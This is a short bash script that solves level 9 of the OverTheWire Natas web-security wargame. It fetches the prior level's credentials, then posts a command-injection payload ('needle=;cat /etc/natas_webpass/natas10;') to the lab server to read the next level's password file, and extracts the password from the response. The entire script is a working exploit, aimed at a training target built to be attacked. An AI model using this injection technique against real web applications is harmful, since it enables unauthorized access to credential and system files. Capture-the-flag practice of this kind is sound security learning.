#!/bin/bash

BASIC=$(./natas8.sh)

PASSWORD=$(curl --user $BASIC --data "needle=;cat /etc/natas_webpass/natas10;&submit" http://natas9.natas.labs.overthewire.org 2>/dev/null | grep /pre -B1 | head -1)

echo "natas10:$PASSWORD"
